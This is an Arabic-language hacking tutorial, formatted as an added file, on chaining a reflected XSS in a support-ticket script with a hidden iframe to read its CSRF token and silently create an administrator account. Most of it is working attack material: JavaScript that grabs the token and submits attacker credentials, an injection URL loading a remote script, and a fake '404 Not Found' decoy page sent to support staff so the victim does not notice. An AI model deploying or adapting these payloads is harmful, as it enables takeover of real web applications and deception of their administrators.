@@ -1,0 +1,104 @@
+ السلام عليكم ورحمة الله وبركاته
+
+Using XSS to bypass CSRF protection
+
+هذه الطريقه سبق وشرحت في بعض المواقع
+الاجنبيه .. من 2009 وشرحها لنا اخونا السويسري
+بس مازالت علامات الاستفهام عند البعض منا
+
+
+
+التخطى هو بلاعتماد على ثغرة xss
+خلونا نبداء بلشرح خطوه خطوه
+
+لدينا سكربت اسمه sec4support
+لايمكنك من تطبيق ثغرات CSRF مثلا اضافة
+ادمن او تغيير حساب ادمن
+
+لاكن دائما هناك حلول
+
+نقوم بفحص السكربت من ثغرة الـxss اما Post او Get
+كيف يعني ؟
+اذا كانت Post فنستخدم html ففي بعض الاحيان
+يخطى المبرمجين في فلترة بعض الملفات وينسون token protection
+من هنا نستغلها ونقوم بحقن كود xss
+اما اذا كانت get
+فتكون من خلال الرابط support/admin/ticket.php?id=xssed
+
+بسم الله نبداء
+راح نحتاج في هذا الشرح الى كود java Script
+وراح نحتاج الى ثغرة xss (:
+
+وجدنا ثغرة الxss برابط التالي
+sec4support/admin/ticket.php?id=xssed
+
+وهدفنا هو اضافة ادمن وتخطى التوكن
+اولا نضيف ادمن جديد من خلال السكربت
+ونقوم بتشغيل اداة Live HTTP Headers
+
+عند اضافة الادمن راح نلاحظ في حقل الPOST
+sec4support/admin/addadmin.php?saveadd=new
+token=2134354673624786dv548u65n5786k658&newpass=admin&newpass=admin&newusername=admin&role=1
+
+هذا اللي راح نحتاجه في كود الجافا
+
+
+
+كود PHP:
+ document.writeln('<iframe id="iframe" src="http://tld.tld/sec4support/admin/addadmin.php" width="0" height="0" onload="read()"></iframe>');
+function read()
+{
+    var newusername = 'or4ng';
+    var newpass = 's4udiT3rr0rist';
+    var newpass2 = 's4udiT3rr0rist';
+    var role = '1';
+    var token =   document.getElementById("iframe").contentDocument.forms[0].token.value;
+     document.location.href = 'http://tld.tld/sec4support/admin/addadmin.php?saveadd=new&token='+ token + '&newusername='+ newusername +'&newpass='+ newpass +'&newpass2='+ newpass2 + '&role='+ role +'';
+
+} 
+لو لدينا حقول مهمه وكثيره لاضافة ادمن
+كل اللي علينا نظيف
+var sec4ever = 'i-Hmx';
+
+sec4ever = اسم القيمه
+
+'i-Hmx'; = اذا كان ايميل نضع ايميل اذا كان
+ياسوورد نضع باسوورد وهكذا
+
+ونظيفها في  document.location.href
+بنفس الطريقه
+
+الان لحقن الكود
+من خلال ثغرة xss
+نظيف
+http://tld.tld/sec4support/admin/ticket.php?id=<script src=http://tld.tld/bypass.js></script>
+
+bypass.js = اسم ملف الجافا
+tld.tld = رابط الملف
+
+نقوم بضافته في  iframe
+
+كود بلغة HTML:
+
+<P align="right"><iframe id=" iframe" src="http://tld.tld/sec4support/admin/ticket.php?id=<script src=http://tld.tld/bypass.js></script>" width="0" height="0"></iframe>
+
+الحين نسوي تمويه عشان مايكشفنا
+فيه طرق كثيره بس بنستخدم اسهلها
+
+
+كود بلغة HTML:
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <P align="right"><P align="right"><iframe id=" iframe" src="http://tld.tld/sec4support/admin/ticket.php?id=<script src=http://tld.tld/bypass.js></script>" width="0" height="0"></iframe> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /index.php was not found on this server.</p> <p>Additionally, a 404 Not Found error was encountered while trying to use an Error Document to handle the request.</p> <hr> </body></html>
+
+نرسل الرابط للدعم بشرط يكون متواجد بلوحه
+وبعد مايفتح الصفحه بيلاحظ انها 404 Not Found
+
+بيقفلها وبيقولك لم اجد الملف
+وبكذا تم اضافة ادمن جديد ولا يدري
+
+نسيت انوه على نقطه
+كيف راح يتخطى التوكن
+هو بلاساس راح يقرى التوكن ويضيفها بلملف
+
+وبكذا يتم التخطى
+
